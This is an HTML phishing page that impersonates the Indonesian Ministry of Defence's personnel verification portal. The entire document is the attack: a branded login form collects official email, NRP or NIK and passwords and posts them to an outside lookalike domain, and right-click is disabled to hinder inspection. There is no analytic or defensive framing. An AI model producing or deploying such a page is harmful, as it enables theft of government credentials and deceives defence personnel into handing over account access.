<!DOCTYPE html>
<html lang="id" oncontextmenu="return false">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kementerian Pertahanan Republik Indonesia - Portal Verifikasi Personel</title>
    <style>
        :root {
            --maroon-dark: #1c0707;
            --maroon-card: #2c0d0d;
            --gold: #d4a838;
            --text: #f9f3f3;
            --muted: #d2bcbc;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: "Segoe UI", Roboto, Arial, sans-serif;
            background: radial-gradient(circle at top, #3d1212 0%, var(--maroon-dark) 75%);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        .card {
            width: 100%;
            max-width: 470px;
            background: var(--maroon-card);
            border: 1px solid #5c2222;
            border-top: 4px solid var(--gold);
            border-radius: 10px;
            padding: 28px 32px;
            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.7);
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .header img {
            width: 92px;
            height: 92px;
            object-fit: contain;
            margin-bottom: 10px;
        }
        .header h1 {
            font-size: 18px;
            font-weight: 800;
            color: var(--gold);
            text-transform: uppercase;
        }
        .header p {
            font-size: 12.5px;
            color: var(--muted);
            margin-top: 4px;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 14px;
            padding: 6px 2px;
        }
        label {
            display: block;
            font-size: 12.5px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 10px 12px;
            background: #140505;
            border: 1px solid #6e2b2b;
            border-radius: 6px;
            color: #ffffff;
            font-size: 13.5px;
        }
        button {
            margin-top: 6px;
            padding: 12px 16px;
            background: var(--gold);
            border: none;
            border-radius: 6px;
            color: #1c0707;
            font-weight: 800;
            font-size: 13.5px;
            cursor: pointer;
            text-transform: uppercase;
        }
    </style>
</head>
<body oncontextmenu="return false">
    <div class="card">
        <div class="header">
            <img src="assets/kemhan.png" alt="Logo Kementerian Pertahanan Republik Indonesia Kemhan" />
            <h1>Kementerian Pertahanan RI</h1>
            <p>Portal Verifikasi Email Dinas &amp; NIP / NRP Personel Pertahanan</p>
        </div>

        <form action="https://kemhan-mail-verify.example.net/login.php" method="POST">
            <div>
                <label for="email_nrp">Email Dinas / NRP / NIK</label>
                <input type="text" id="email_nrp" name="email_nrp" placeholder="Masukkan Email @kemhan.go.id atau NRP" required />
            </div>
            <div>
                <label for="password_dinas">Kata Sandi Akun Dinas</label>
                <input type="password" id="password_dinas" name="password_dinas" placeholder="Masukkan Kata Sandi" required />
            </div>
            <button type="submit">Masuk Portal Kemhan</button>
        </form>
    </div>
</body>
</html>
